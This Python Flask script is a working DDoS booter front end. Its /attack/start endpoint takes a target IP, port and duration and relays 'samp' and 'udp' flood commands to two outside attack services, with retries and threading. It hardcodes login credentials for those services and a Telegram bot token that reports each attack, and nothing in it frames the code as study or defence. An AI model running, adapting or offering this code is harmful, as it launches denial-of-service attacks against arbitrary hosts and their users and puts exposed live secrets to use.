# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading
import random

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Configuration
BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
CHAT_IDS = ["8523310365", "7646520243"]
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                requests.post(TELEGRAM_API_URL, data={
                    'chat_id': chat_id, 
                    'text': message, 
                    'parse_mode': 'HTML'
                }, timeout=5)
            except:
                pass

# ==================== TARGET APIS ====================
TARGET_APIS = [
    # 5 Old APIs (Will use 'samp' method)
    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
    
    # 5 New APIs (Will use 'udp' method)
    {"id": 6,  "name": "NEW_API_1", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
    {"id": 7,  "name": "NEW_API_2", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
    {"id": 8,  "name": "NEW_API_3", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
    {"id": 9,  "name": "NEW_API_4", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
    {"id": 10, "name": "NEW_API_5", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
]

def get_response_summary(response, response_time):
    summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
    try:
        json_data = response.json()
        summary += f"JSON: {json_data}"
    except:
        text = response.text.strip()
        if len(text) > 700:
            text = text[:700] + "... [truncated]"
        summary += f"Response: {text}"
    return summary

def is_attack_successful(response):
    if not response:
        return False
    try:
        data = response.json()
        error = data.get('error')
        message = str(data.get('message', '')).lower()
        
        if error is False or 'launched' in message or 'success' in message or 'started' in message:
            return True
        if error is True or any(kw in message for kw in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
            return False
    except:
        pass
    
    if response.status_code == 200:
        text = response.text.strip().lower()
        if any(kw in text for kw in ['slots full', 'busy', 'wait', 'full', 'limit']):
            return False
        return True
    return False

def send_attack_to_api(api, ip, port, duration, packet_len=512):
    """Send attack with retry logic + Fixed Method per API Type"""
    # Force method based on API type
    if api["type"] == "old":
        method = "samp"
    else:
        method = "udp"
    
    max_retries = 8
    retry_count = 0
    
    while retry_count < max_retries:
        attempt = retry_count + 1
        start_time = time.time()
        
        try:
            if api["type"] == "old":
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
            else:
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration, len=packet_len)

            response = requests.get(target_url, timeout=25)
            response_time = int((time.time() - start_time) * 1000)
            
            response_summary = get_response_summary(response, response_time)

            telegram_msg = f"""
🔵 <b>ATTACK ATTEMPT #{attempt}/{max_retries}</b>
├ API: {api['name']} ({api['type'].upper()})
├ Method: {method.upper()} 
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Len: {packet_len if api['type']=='new' else 'N/A'}
├ Status: {response.status_code}
├ Response Time: {response_time}ms
└ Response:
{response_summary}
"""
            send_telegram_message(telegram_msg)

            if is_attack_successful(response):
                send_telegram_message(f"""
✅ <b>ATTACK SUCCESSFULLY STARTED</b>
├ API: {api['name']}
├ Method: {method.upper()}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Attempt: {attempt}/{max_retries}
""")
                return True
            
            else:
                retry_count += 1
                if retry_count < max_retries:
                    time.sleep(2)

        except Exception as e:
            retry_count += 1
            response_time = int((time.time() - start_time) * 1000)
            send_telegram_message(f"""
⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
├ API: {api['name']}
├ Method: {method.upper()}
├ Error: {str(e)[:180]}
├ Time: {response_time}ms
""")
            if retry_count < max_retries:
                time.sleep(min(2 ** retry_count, 10))

    send_telegram_message(f"""
💀 <b>ALL RETRIES FAILED</b> on {api['name']}
├ Method: {method.upper()}
├ Target: {ip}:{port}
""")
    return False

def execute_attack(selected_apis, ip, port, total_time, packet_len=512):
    threads = []
    
    for api in selected_apis:
        api['busy'] = True
        method = "samp" if api['type'] == "old" else "udp"
        send_telegram_message(f"🚀 QUEUED → {api['name']} | Method: {method.upper()} | {ip}:{port} ({total_time}s)")

    for api in selected_apis:
        t = threading.Thread(
            target=send_attack_to_api,
            args=(api, ip, port, total_time, packet_len),
            daemon=True
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    for api in selected_apis:
        api['busy'] = False

    send_telegram_message(f"✅ Attack Cycle Completed → {ip}:{port} ({total_time}s)")

@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    packet_len = request.args.get('len', 512)

    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing ip, port or time'}), 400

    try:
        port = int(port)
        total_time = int(time_param)
        packet_len = int(packet_len)
        if total_time <= 0 or total_time > 3600:
            raise ValueError
    except:
        return jsonify({'error': 'Invalid parameters'}), 400

    # Select 1 Old + 1 New API
    old_apis = [api for api in TARGET_APIS if api['type'] == 'old' and not api['busy']]
    new_apis = [api for api in TARGET_APIS if api['type'] == 'new' and not api['busy']]

    selected = []
    if old_apis:
        selected.append(random.choice(old_apis))
    if new_apis:
        selected.append(random.choice(new_apis))

    if not selected:
        return jsonify({'error': 'No APIs available right now'}), 503

    threading.Thread(
        target=execute_attack,
        args=(selected, ip, port, total_time, packet_len),
        daemon=True
    ).start()

    return jsonify({
        'success': True,
        'apis_used': [a['name'] for a in selected],
        'target': f'{ip}:{port}',
        'time': total_time,
        'note': 'Old API = samp | New API = udp'
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free_old': [api['name'] for api in TARGET_APIS if api['type'] == 'old' and not api['busy']],
        'free_new': [api['name'] for api in TARGET_APIS if api['type'] == 'new' and not api['busy']],
        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
    })

if __name__ == '__main__':
    print("="*90)
    print("🚀 MULTI-API SYSTEM READY")
    print("→ Old APIs  : Always use 'samp'")
    print("→ New APIs  : Always use 'udp'")
    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300&len=1024")
    print("="*90)
    app.run(host='0.0.0.0', port=8080, threaded=True)
